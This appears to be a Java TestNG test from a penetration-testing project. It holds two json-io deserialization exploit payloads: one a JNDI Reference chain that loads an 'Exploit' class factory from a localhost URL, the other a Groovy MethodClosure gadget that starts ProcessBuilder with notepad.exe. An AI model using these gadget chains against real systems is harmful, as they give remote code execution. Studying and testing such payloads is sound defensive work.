package de.marko.pentest.parser;

import com.cedarsoftware.util.io.JsonIoException;
import org.testng.annotations.Test;

/**
 * @author marko
 * @version 1.0.0.
 * @date 20.08.2017
 */
public class JsonIOParserTest {

	@Test
	public void T001_parseJSONIO() throws JsonIoException {

		String payload = "{\"@type\":\"java.util.Arrays$ArrayList\",\"@items\":[{\"@id\":2,\"@type\":\"jdk.nashorn.internal.objects.NativeString\",\"value\":{\"@type\":\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\",\"dataHandler\":{\"dataSource\":{\"@type\":\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\",\"contentType\":null,\"is\":{\"@type\":\"javax.crypto.CipherInputStream\",\"cipher\":{\"@type\":\"javax.crypto.NullCipher\",\"provider\":null,\"spi\":null,\"transformation\":null,\"cryptoPerm\":null,\"exmech\":null,\"initialized\":false,\"opmode\":0,\"firstSpi\":null,\"firstService\":null,\"serviceIterator\":{\"@type\":\"sun.misc.Service$LazyIterator\",\"service\":null,\"loader\":null,\"configs\":{\"@type\":\"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\",\"candidates\":{\"@type\":\"com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\",\"candidates\":null,\"nextMatch\":{\"attrs\":null,\"boundObj\":{\"@type\":\"javax.naming.spi.ContinuationDirContext\",\"cpe\":{\"@id\":1,\"remainingNewName\":null,\"environment\":null,\"altName\":null,\"altNameCtx\":null,\"resolvedName\":null,\"resolvedObj\":{\"@type\":\"javax.naming.Reference\",\"className\":\"Foo\",\"addrs\":[],\"classFactory\":\"Exploit\",\"classFactoryLocation\":\"http://localhost:8080/\"},\"remainingName\":null,\"rootException\":null,\"detailMessage\":null,\"cause\":{\"@ref\":1},\"stackTrace\":[],\"suppressedExceptions\":{\"@type\":\"java.util.Collections$UnmodifiableRandomAccessList\"}},\"env\":null,\"contCtx\":null},\"name\":\"foo\",\"className\":null,\"fullName\":null,\"isRel\":true},\"cons\":null,\"filter\":null,\"context\":null,\"env\":null,\"useFactory\":false},\"nextMatch\":null,\"cons\":{\"searchScope\":1,\"timeLimit\":0,\"derefLink\":false,\"returnObj\":false,\"countLimit\":0,\"attributesToReturn\":null},\"filter\":null,\"context\":null,\"env\":null,\"useFactory\":true},\"pending\":null,\"returned\":{\"@type\":\"java.util.TreeSet\"},\"nextName\":null},\"transforms\":null,\"lock\":{}},\"input\":{\"@type\":\"java.lang.ProcessBuilder$NullInputStream\"},\"ibuffer\":[],\"done\":false,\"obuffer\":null,\"ostart\":0,\"ofinish\":0,\"closed\":false,\"in\":null},\"consumed\":false},\"objDataSource\":null,\"object\":null,\"objectMimeType\":null,\"currentCommandMap\":null,\"transferFlavors\":[],\"dataContentHandler\":null,\"factoryDCH\":null,\"oldFactory\":null,\"shortType\":null},\"data\":null,\"dataLen\":0,\"mimeType\":null},\"map\":null,\"proto\":null,\"flags\":0,\"primitiveSpill\":null,\"objectSpill\":null,\"arrayData\":null},{\"@type\":\"java.util.HashMap\",\"@keys\":[{\"@ref\":2},{\"@ref\":2}],\"@items\":[{\"@ref\":2},{\"@ref\":2}]}]}";

		String payload2 = "{\"@type\":\"java.util.Arrays$ArrayList\",\"@items\":[{\"@id\":2,\"@type\":\"groovy.util.Expando\",\"expandoProperties\":{\"@type\":\"java.util.HashMap\",\"hashCode\":{\"@type\":\"org.codehaus.groovy.runtime.MethodClosure\",\"method\":\"start\",\"delegate\":{\"@id\":1,\"@type\":\"java.lang.ProcessBuilder\",\"command\":{\"@type\":\"java.util.ArrayList\",\"@items\":[\"notepad.exe\"]},\"directory\":null,\"environment\":null,\"redirectErrorStream\":false,\"redirects\":null},\"owner\":{\"@ref\":1},\"thisObject\":null,\"resolveStrategy\":0,\"directive\":0,\"parameterTypes\":[],\"maximumNumberOfParameters\":0,\"bcw\":null}}},{\"@type\":\"java.util.HashMap\",\"@keys\":[{\"@ref\":2},{\"@ref\":2}],\"@items\":[{\"@ref\":2},{\"@ref\":2}]}]}";

		DummyParser parser = new DummyParser();

		parser.parseJsonIO(payload2);

		// Dummy dummy = parser.parseJsonIO(payload2);

	}

}
